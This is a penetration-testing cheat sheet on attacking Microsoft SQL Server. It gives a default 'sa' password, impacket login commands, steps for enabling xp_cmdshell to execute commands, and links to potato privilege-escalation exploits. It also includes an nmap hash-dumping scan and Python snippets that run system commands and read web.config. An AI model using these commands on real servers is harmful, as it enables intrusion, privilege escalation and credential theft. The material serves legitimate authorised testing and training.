Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet). Default port is 1433.

### Default Admin Credentials
---

```
Username: sa
Password: poiuytrewq
```

### impacket-mssqlclient
---

- The ``impacket`` Python library is incredibly powerful, and contains a tool for connecting to MSSQL databases.

```shell
# Connect to MS-SQL Server
impacket-mssqlclient <username>:'<password>'@<target>

# Connect to MS-SQL Server via default SA creds
impacket-mssqlclient sa:'poiuytrewq'@<target>
```

![[Pasted image 20230528134806.png]]

### xp_cmdshell
---

- ``xp_cmdshell`` is the most common way of establishing code execution via MSSQL.  By default it is disabled for security, but with the right privileges we can easily enable it.

Per Microsoft documentation, here is how to utilize ``sp_configure`` to enable ``xp_cmdshell``

![[Pasted image 20230306145014.png]]

Once ``xp_cmdshell`` is enabled, you can execute code on the SQL server.

```shell
# Enable XP_CMDSHELL for Remote Code Exection
> EXECUTE sp_configure 'show advanced options', 1;
> RECONFIGURE;
> EXECUTE sp_configure 'xp_cmdshell', 1;
> RECONFIGURE;
> xp_cmdshell '<command>'
```

![[Pasted image 20230528134406.png]]

### Privilege Escalation
---

- The user running MS-SQL server will often have enabled the privilege token ``SeImpersonatePrivilege`` -- this means we can exploit this privilege using one of the many exploits in the potato family to elevate to "NT AUTHORITY/SYSTEM"

Common Potatoes Exploiting "SeImpersonatePrivilege":
- https://github.com/tylerdotrar/GodPotatoNet (Self-Plug)
- https://github.com/BeichenDream/GodPotato
- https://github.com/itm4n/PrintSpoofer
- https://github.com/zcgonvh/EfsPotato

### Other
---
(Thank you [@numonce](https://github.com/numonce))

##### Nmap
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

##### sqsh
- ``sqsh`` is an interactive ms-sql client that is installed on kali by default. When used in conjunction with ``xp_cmdshell`` we can execute arbitrary PowerShell and cmd commands. 

![[Pasted image 20230103184704.png]]


##### Python
- Some versions of ms-sql allow you to execute inline python or R scripts.
```php
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
